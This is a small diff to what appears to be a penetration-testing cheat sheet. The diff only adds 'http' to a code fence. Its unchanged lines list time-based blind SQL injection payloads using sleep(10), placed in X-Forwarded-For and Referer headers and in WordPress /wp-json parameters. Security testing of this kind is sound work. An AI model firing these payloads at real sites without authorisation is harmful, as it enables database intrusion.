@@ -290,7 +290,7 @@ X-Forwarded-For: '+(select*from(select(sleep(10)))a)$2b'
 Referer: '+(select*from(select(sleep(10)))a)$2b'
 ```
 - Try sending common parameters manually, even if they're not shown in the frontend. Sometimes the backend processes them silently:
-```
+```http
 /wp-json?debug='+select*from(select(sleep(10)))a$2b
 /wp-json?search='+select*from(select(sleep(10)))a$2b
 /wp-json?id='+select*from(select(sleep(10)))a$2b
